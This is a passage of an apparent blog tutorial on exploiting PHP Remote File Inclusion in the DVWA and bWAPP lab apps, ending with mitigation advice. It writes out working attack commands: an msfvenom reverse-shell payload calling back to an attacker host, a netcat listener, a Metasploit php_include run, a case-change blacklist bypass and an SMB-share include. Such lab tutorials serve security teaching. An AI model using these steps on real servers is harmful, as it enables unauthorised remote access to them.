<p><img src="https://1.bp.blogspot.com/-NjqRlOu3HLQ/XyQP9zyn5MI/AAAAAAAAmcc/Iis3cD8Y2mU1w3wBuCRE-w4f6ZTYEBhdACLcBGAsYHQ/s1600/1.png" alt="" /></p>
<p>But this&nbsp;<strong>logical</strong>&nbsp;<strong>error</strong>&nbsp;didn&rsquo;t fulfil the requirements to RFI vulnerability until the developer&nbsp;<strong>enables</strong>&nbsp;<strong>some</strong>&nbsp;<strong>insecure</strong>&nbsp;<strong>PHP</strong>&nbsp;<strong>settings</strong>&nbsp;as &ldquo;<strong><em>allow_url_include = On</em></strong>&rdquo; and &ldquo;<strong><em>allow_url_fopen = On</em></strong>&rdquo;, Therefore the combination of these two i.e. the developer logic and the insecure settings, open the gates to the disastrous RFI vulnerability.</p>
<p><img src="https://1.bp.blogspot.com/-HNZ4fwu0YMI/XyQQBJmtCiI/AAAAAAAAmcg/foJN_ltTkuobUEjZm-Jq9p3SO3xjw03cACLcBGAsYHQ/s1600/2.png" alt="" /></p>
<h3><strong>Basic Remote File Inclusion</strong></h3>
<p>I guess, up till now, you might be having a clear vision with&nbsp;<strong>what is Remote File Inclusion&nbsp;</strong>and<strong>&nbsp;why it occurs<em>.</em>&nbsp;</strong>So let&rsquo;s try to dig some deeper and&nbsp;<strong>deface</strong>&nbsp;<strong>some</strong>&nbsp;<strong>web-applications</strong>&nbsp;with a goal to achieve a&nbsp;<strong>reverse shell</strong>.</p>
<p>I&rsquo;ve opened the target IP in my browser and logged in inside&nbsp;<strong>DVWA</strong>&nbsp;as&nbsp;<strong>admin: password,&nbsp;</strong><strong>further</strong>&nbsp;I&rsquo;ve opted for the&nbsp;<strong>File</strong>&nbsp;<strong>Inclusion</strong>&nbsp;<strong>vulnerability</strong>&nbsp;present on the left-hand side of the window. And even for this time, I&rsquo;ve kept the&nbsp;<strong>security level</strong>&nbsp;to&nbsp;<strong>low.</strong></p>
<p><strong>Note :</strong></p>
<p><strong>allow_url_include</strong>&nbsp;is&nbsp;<strong>disabled</strong>&nbsp;by default. If&nbsp;<strong>allow_url_fopen</strong>&nbsp;is&nbsp;<strong>disabled</strong>,&nbsp;<strong>allow_url_include</strong>&nbsp;is also&nbsp;<strong>disabled</strong></p>
<p>You can&nbsp;<strong>enable</strong>&nbsp;allow_url_include from&nbsp;<strong>php.ini</strong>&nbsp;by running the following commands :</p>
<pre class="lang:default decode:true">nano /etc/php/7.2/apache2/php.ini
allow_url_include = On
allow_url_include = Off</pre>
<p>Therefore now we&rsquo;ll be presented with a web-page which is suffering from File Inclusion vulnerability as it is simply including the include.php file into its URL parameter as<strong>&nbsp;</strong></p>
<p><strong>&ldquo;</strong><strong>page=include.php</strong><strong>&rdquo;</strong></p>
<p><img src="https://1.bp.blogspot.com/-mHiCUPJo3Aw/XyQQEkcIIKI/AAAAAAAAmck/05EHrLsQCX81KsXguPQ7TMr78sBwMDXKACLcBGAsYHQ/s1600/3.png" alt="" /></p>
<p>Let&rsquo;s try to manipulate this URL parameter and surf&nbsp;<strong>google</strong>.<strong>com</strong>&nbsp;over this&nbsp;<strong>DVWA</strong>&nbsp;application as:</p>
<pre class="lang:default decode:true">192.168.0.2/DVWA/vulnerabilities/fi/?page=https://www.google.com</pre>
<p><img src="https://1.bp.blogspot.com/-oZ7UpDapQYc/XyQQIBMguII/AAAAAAAAmco/ICui4Iyn6c8MFG5UKe7v15rrwGoD-gI2wCLcBGAsYHQ/s1600/4.png" alt="" /></p>
<p>Cool !! The below image thus confirms up that this application is vulnerable to RFI vulnerability.</p>
<h3><strong>Reverse Shell through Netcat</strong></h3>
<p><em>Won&rsquo;t you be happy, if we could convert this basic RFI exploitation to a reverse shell, let&rsquo;s check it out how?</em></p>
<p>Initially, we&rsquo;ll generate up a payload using the best php one-liner as:</p>
<pre class="lang:default decode:true">msfvenom -p php/reverse_php lport=4444 lhost=192.168.0.5 &gt; /root/Desktop/shell.php</pre>
<p><img src="https://1.bp.blogspot.com/-CQXQJStkBGY/XyQQLmnLM-I/AAAAAAAAmcs/jeIcWmvchZ4TOIU4QEiMA_NPDAoVcfGnwCLcBGAsYHQ/s1600/05.png" alt="" /></p>
<p>Great, let&rsquo;s now host this directory so that we could use it over in the URL parameter.</p>
<pre class="lang:default decode:true">python &ndash;m SimpleHTTPServer</pre>
<p>From the below image, you can see that the&nbsp;<strong>Desktop</strong>&nbsp;<strong>folder</strong>&nbsp;has been&nbsp;<strong>hosted</strong>&nbsp;over the&nbsp;<strong>HTTP</strong>&nbsp;<strong>server</strong>&nbsp;on&nbsp;<strong>port</strong>&nbsp;<strong>8000.</strong></p>
<p><strong><img src="https://1.bp.blogspot.com/-etyNjLMImE4/XyQQOnMJ51I/AAAAAAAAmcw/W8xkboMQZiolbvHZheJx5O6CCer8DGYlwCLcBGAsYHQ/s1600/06.png" alt="" /></strong></p>
<p>Now let&rsquo;s boot up our&nbsp;<strong>Netcat listener&nbsp;</strong>over on&nbsp;<strong>port 4444</strong></p>
<pre class="lang:default decode:true">nc &ndash;lvp 4444</pre>
<p>As the netcat is about to listen, till that time, let&rsquo;s include our shell over in the vulnerable URL parameter as :</p>
<pre class="lang:default decode:true">192.168.0.2/DVWA/vulnerabilities/fi/?page=http://192.168.0.5:8000/shell.php</pre>
<p><img src="https://1.bp.blogspot.com/-VJGpHIkjuR4/XyQQR4SLyzI/AAAAAAAAmc4/jDIQ1eXUmMI93vFZoyvLu9HazvdqC6InQCLcBGAsYHQ/s1600/07.png" alt="" /></p>
<p>Fire up the forward button and get back our netcat listener, it might have some interesting things for us.\&nbsp;Great !! We&rsquo;ve successfully captured up the reverse shell. Let&rsquo;s grab up some striking details now.</p>
<p><strong><img src="https://1.bp.blogspot.com/-t2vgUgaaTAs/XyQQVmtJUQI/AAAAAAAAmdA/bZARmyVWrXk-0Von5nJRmGf9-QSAsQEQACLcBGAsYHQ/s1600/08.png" alt="" />&nbsp;</strong></p>
<h3><strong>RFI over Metasploit</strong></h3>
<p>Wasn&rsquo;t the Netcat procedure was long and complicated enough, just to get a reverse shell.</p>
<p>So let&rsquo;s do some smart work &amp; let&rsquo;s boot one of the favourite tools of every pentester i.e.&nbsp;<strong>&ldquo;Metasploit&rdquo;</strong></p>
<p>But before using any exploit into that, let&rsquo;s capture up the&nbsp;<strong>HTTP</strong>&nbsp;<strong>Header</strong>&nbsp;of the URL that confirmed us the RFI existence i.e.&nbsp;<strong><em>&ldquo;page=https://www.google.com&rdquo;&nbsp;</em></strong>&nbsp;and further&nbsp;<strong>copy</strong>&nbsp;the logged in&nbsp;<strong>PHP session id</strong>&nbsp;along with all the&nbsp;<strong>security information.</strong></p>
<p>Here I&rsquo;ve used the Live HTTP Header &ndash; a firefox plugin, in order to capture the same.</p>
<p><img src="https://1.bp.blogspot.com/-bIy1ht1niU8/XyQQej-HlxI/AAAAAAAAmdQ/7CmhErgskxEPEK075H17IDNQor_tbraCQCLcBGAsYHQ/s1600/9.png" alt="" /></p>
<p>So, it&rsquo;s time to get the full control of the web application&rsquo;s server, just simply execute the following commands and you are good to in:</p>
<pre class="lang:default decode:true">msf &gt; use exploit/unix/webapp/php_include
set payload php/meterpreter/bind_tcp
set RHOST 192.168.0.2
set PATH /DVWA/vulnerabilities/fi/
set HEADERS " Cookie: security=low; PHPSESSID=4536da6h54ski6ftv09gdq35ik"
exploit</pre>
<p>Wooah !! With some basic executions, we got the&nbsp;<strong>meterpreter</strong>&nbsp;<strong>session</strong>.</p>
<p><img src="https://1.bp.blogspot.com/-dJAKPHgJyaU/XyQQjCsefNI/AAAAAAAAmdY/Q1l7QlEDxb0IzkyRFrRlk4a5yomwWthcQCLcBGAsYHQ/s1600/10.png" alt="" /></p>
<h3><strong>Bypass a Blacklist Implemented</strong></h3>
<p>So, it&rsquo;s not every time we would be lucky enough that the developer sets up the code without any validations, they might set some blacklists with the commonly used elements as &ldquo;<strong>http:</strong>&rdquo; or &ldquo;<strong>https:</strong>&rdquo; or even similar to them in order to secure up their web-application.</p>
<p>Therefore to bypass this implemented blacklist, we need to try all the different combinations like&nbsp;<strong>&ldquo;HTTP:&rdquo;</strong>&nbsp;or&nbsp;<strong>&ldquo;hTTp:&rdquo;</strong>&nbsp;that the developer might forget to add.</p>
<p>I&rsquo;ve increased up the&nbsp;<strong>security level to &ldquo;medium&rdquo;</strong>&nbsp;and tried up with all the different combinations. From the below image you can see that the&nbsp;&nbsp;<strong>&ldquo;HTTPS&rdquo;&nbsp;</strong>worked for me and would thus be able to exploit the RFI vulnerability again.</p>
<p><img src="https://1.bp.blogspot.com/-ntkKjmUZnwE/XyQQnly75oI/AAAAAAAAmdc/Cjnw9bjxv6AuiMevvY9oCY2B2KWlsR-6gCLcBGAsYHQ/s1600/11.png" alt="" /></p>
<h3><strong>Null Byte Attack</strong></h3>
<p><em>A developer can never forget, to add up a&nbsp;<strong>&lsquo;.php&rsquo;&nbsp;</strong>extension into their codes at the end of the required variable before it gets included.&nbsp;</em>That is the webserver will interpret every file with the&nbsp;<strong>&ldquo;.php&rdquo; extension</strong>.</p>
<p><em>Thus, if I wish to include&nbsp;<strong>&ldquo;tryme.txt&rdquo;</strong>&nbsp;into the URL parameter, the server would&nbsp;<strong>interpret</strong>&nbsp;it as&nbsp;<strong>&ldquo;tryme.txt.php.&rdquo;&nbsp;</strong><strong>and drop back an error message.</strong></em></p>
<p><strong><em><img src="https://1.bp.blogspot.com/-xFLzyfATLJ4/XyQQyQaHAYI/AAAAAAAAmdo/et0xZMZfdcEE2EPXpNEvNVyof1UY2049QCLcBGAsYHQ/s1600/12.png" alt="" /></em></strong></p>
<p>So what should we do when the developer sets this all?</p>
<p>The answer is to go for the&nbsp;<strong>Null</strong>&nbsp;<strong>Byte</strong>&nbsp;<strong>Attack,</strong>&nbsp;using up the question mark&nbsp;<strong>[?]</strong>&nbsp;character, which will thus&nbsp;<strong>neutralize</strong>&nbsp;the problem of the &ldquo;<strong>.php</strong>&rdquo;, forcing the php server to ignore everything after that, as soon as it is interpreted.</p>
<p>192.168.0.3/bWAPP/rlfi.php?language=http://192.168.0.5:8000/tryme.txt?</p>
<p><img src="https://1.bp.blogspot.com/-JqP_X25Ihko/XyQQ2VGFu-I/AAAAAAAAmdw/wtHY7q4PngEnlWL911AKhVwnV2Bv70fKACLcBGAsYHQ/s1600/13.png" alt="" /></p>
<h3><strong>Exploitation through SMB Server</strong></h3>
<p>As discussed earlier,&nbsp;<strong>RFI</strong>&nbsp;<strong>vulnerability</strong>&nbsp;is about to impossible until the developer enables up the &ldquo;<strong>allow_url_include</strong>&rdquo; or &ldquo;<strong>allow_url_fopen</strong>&rdquo; in the&nbsp;<strong>php.ini&nbsp;</strong>file.</p>
<p><em>But what if, if the developer&nbsp;<strong>never</strong>&nbsp;<strong>enabled</strong>&nbsp;that feature, and run his web application as simple as he could without including any specific file from any remote server. Would it still be vulnerable to RFI?</em></p>
<p><em>The answer is&nbsp;<strong>&ldquo;Yes&rdquo;,&nbsp;</strong>RFI vulnerabilities can be exploited through the&nbsp;<strong>SMB Server&nbsp;</strong>even if the &ldquo;<strong>allow_url_include</strong>&rdquo; or &ldquo;<strong>allow_url_fopen</strong>&rdquo; is set to&nbsp;<strong>Off.</strong></em></p>
<p><em>As when the &ldquo;allow_url_include&rdquo; in PHP is set to &ldquo;off&rdquo;, it&nbsp;<strong>does</strong>&nbsp;<strong>not</strong>&nbsp;<strong>load</strong>&nbsp;any&nbsp;<strong>remote</strong>&nbsp;<strong>HTTP</strong>&nbsp;or&nbsp;<strong>FTP</strong>&nbsp;<strong>URL&rsquo;s</strong>&nbsp;to prevent remote file inclusion attacks, but this &rdquo;allow_url_include&rdquo;&nbsp;<strong>does</strong>&nbsp;<strong>not</strong>&nbsp;<strong>prevent</strong>&nbsp;<strong>loading</strong>&nbsp;<strong>SMB</strong>&nbsp;<strong>URLs</strong>.</em></p>
<p>Wonder how to grab this all? Let&rsquo;s exploit it out here in this section. So, I&rsquo;ve set up the vulnerable&nbsp;<strong>bWAPP&nbsp;</strong>application over in my windows machine. You can do the same from&nbsp;here.</p>
<p><strong>Lets Start !!</strong></p>
<p>Initially, I had&nbsp;<strong>reconfigured</strong>&nbsp;my&nbsp;<strong>PHP</strong>&nbsp;server by&nbsp;<strong>disallowing</strong>&nbsp;the &ldquo;<strong>allow_url_include</strong>&rdquo; and &ldquo;<strong>allow_url_fopen</strong>&rdquo; wrapper in the &ldquo;<strong>php.ini</strong>&rdquo; file at&nbsp;<strong>C:\xampp\php\</strong></p>
<p><img src="https://1.bp.blogspot.com/-BbsrsF0kaGI/XyQQ6ctW2II/AAAAAAAAmd4/ns7bUe3tx_kWM2qY9lclO3ym4wiQ21z8ACLcBGAsYHQ/s1600/14.png" alt="" /></p>
<p>Now in order to activate the&nbsp;<strong>SMB</strong>&nbsp;<strong>service</strong>&nbsp;in my Kali machine,&nbsp; I&rsquo;ve used the impacket toolkit which thus set up everything with a simple one-liner as:</p>
<pre class="lang:default decode:true">python smbshare.py &ndash;smb2support sharepath /root/Desktop/Shells</pre>
<p>As we are&nbsp;<strong>executing</strong>&nbsp;our&nbsp;<strong>attack</strong>&nbsp;over the&nbsp;<strong>windows</strong>&nbsp;<strong>10</strong>&nbsp; machine, so here I have used the&nbsp;<strong>&ldquo;smb2support&rdquo;,&nbsp;</strong>and had further set the share directory as&nbsp;<strong>/root/Desktop/Shells/</strong>&nbsp;.</p>
<p>From the below image you can see that our directory has been&nbsp;<strong>shared</strong>&nbsp;successfully&nbsp;<strong>over</strong>&nbsp;the&nbsp;<strong>SMB</strong>&nbsp;<strong>server</strong>&nbsp;without any specific credentials.</p>
<p><img src="https://1.bp.blogspot.com/-gAoY8z39wVI/XyQQ-O9aqAI/AAAAAAAAmd8/uYU-29Fn6hM6Ik0SHG-F2mS4Hbt01VTNACLcBGAsYHQ/s1600/15.png" alt="" /></p>
<p>In order to confirm up the same, let&rsquo;s check it all out on any windows machine over the &ldquo;<strong>Run dialog</strong>&nbsp;<strong>box</strong>&rdquo; as</p>
<p>\\192.168.0.8\sharepath\</p>
<p><img src="https://1.bp.blogspot.com/-5ApkuO7XQv4/XyQRCGnJRqI/AAAAAAAAmeA/9APHGiOvKPkJCK2cZ4t2Smt9UjPYWFtlgCLcBGAsYHQ/s1600/16.png" alt="" /></p>
<p>Cool !! Our SMB Server is working perfectly and we&rsquo;re able to access its shared files.</p>
<p>So let&rsquo;s get back to our Kali machine and check whether the PHP code is allowing any remote file inclusion or not. From the below image, you can see that when I tried with the basic RFI attack, I was presented with an error message as &ldquo;<strong>https:// wrapper is disabled</strong>&rdquo; by&nbsp;<strong>allow_url_include=0;&nbsp;</strong>which thus confirms me up that the PHP code is blocking the files to be included from any remote server.</p>
<p><img src="https://1.bp.blogspot.com/-M_r5i7LzuyU/XyQRFvnEOSI/AAAAAAAAmeE/nEgV6CwoypUZcucrGGpxsoHhG2JLTKaygCLcBGAsYHQ/s1600/17.png" alt="" /></p>
<p>So, it&rsquo;s time to deface this web-application by bypassing the &ldquo;<strong>allow_url_include</strong>&rdquo;&nbsp;<strong>wrapper&nbsp;</strong>with our&nbsp;<strong>SMB</strong>&nbsp;<strong>share</strong>&nbsp;<strong>link</strong>&nbsp;as :</p>
<pre class="lang:default decode:true">192.168.0.3/bWAPP/rlfi.php?language=\\192.168.0.8\sharepath\shell.txt</pre>
<p>Great !! From the below image you can see that our shell has successfully included into this vulnerable web-application and we&rsquo;re presented with the contents of it.</p>
<p><img src="https://1.bp.blogspot.com/-85Y-JfI7VKw/XyQRJvGQ-vI/AAAAAAAAmeM/mHUzXLKZh_E333QPmDlzaSCzaXJ8hx40wCLcBGAsYHQ/s1600/18.png" alt="" /></p>
<h3><strong>Mitigation Steps</strong></h3>
<ul>
<li>To prevent web applications from the file inclusion attacks, we need to use&nbsp;<strong>strong</strong>&nbsp;<strong>input</strong>&nbsp;<strong>validation</strong>. we should&nbsp;<strong>restrict</strong>&nbsp;the&nbsp;<strong>input</strong>&nbsp;<strong>parameter</strong>&nbsp;to&nbsp;<strong>accept</strong>&nbsp;a&nbsp;<strong>whitelist</strong>&nbsp;of&nbsp;<strong>acceptable</strong>&nbsp;files and&nbsp;<strong>reject</strong>&nbsp;<strong>all</strong>&nbsp;<strong>other</strong>&nbsp;<strong>inputs</strong>&nbsp;that&nbsp;<strong>do</strong>&nbsp;<strong>not</strong>&nbsp;<strong>strictly</strong>&nbsp;<strong>conform</strong>&nbsp;to&nbsp;<strong>specifications</strong>.</li>
</ul>
<p>Sanitizing user-supplied / controlled inputs to the best of your ability is always preferable. Those inputs are: GET/post parameters</p>
<ul>
<li>URL parameters</li>
<li>Cookie values</li>
<li>HTTP header values</li>
</ul>
<p>This can all be examined with the following code snippet:</p>
<p><img src="https://1.bp.blogspot.com/-8yD1j4E329w/XyQSKxZaORI/AAAAAAAAmew/Ln3rMFqSBS4uNnkKKuySxl4HKcYHVp0MACLcBGAsYHQ/s1600/32.png" alt="" /></p>
<ul>
<li><strong>Develop</strong>&nbsp;or run the&nbsp;<strong>code</strong>&nbsp;in the&nbsp;<strong>most</strong>&nbsp;<strong>recent</strong>&nbsp;<strong>version</strong>&nbsp;of the&nbsp;<strong>PHP</strong>&nbsp;<strong>server</strong>&nbsp;which is&nbsp;<strong>available</strong>. And even&nbsp;<strong>configure</strong>&nbsp;the&nbsp;<strong>PHP</strong>&nbsp;<strong>applications</strong>&nbsp;so that it&nbsp;<strong>does</strong>&nbsp;<strong>not</strong>&nbsp;<strong>use</strong>&nbsp;<strong>register_globals</strong>.</li>
<li>On the&nbsp;<strong>server-side</strong>, configure the&nbsp;<strong>ini</strong>&nbsp;configuration file, by&nbsp;<strong>disallowing</strong>&nbsp;<strong>remote</strong>&nbsp;<strong>file</strong>&nbsp;<strong>include</strong>&nbsp;of&nbsp;<strong>http</strong>&nbsp;<strong>URI</strong>&nbsp;which&nbsp;<strong>limits the ability to include</strong>&nbsp;the&nbsp;<strong>files from remote locations</strong>&nbsp;i.e. by changing the configuration file with the following command:</li>
</ul>
<p><strong>nano /etc/php/7.2/apache2/php.ini</strong></p>
<pre class="lang:default decode:true">"allow_url_fopen = OFF"
"allow_url_include = OFF"
sudo service apache2 restart</pre>
<p><img src="https://1.bp.blogspot.com/-_Z5WuMsxTBg/XyQRbJ-RzGI/AAAAAAAAmek/SAixiZXSLzwriPRXEZqMc3gNpzciQruMgCLcBGAsYHQ/s1600/19.png" alt="" /></p>
</div>
</div>
</body>
</html>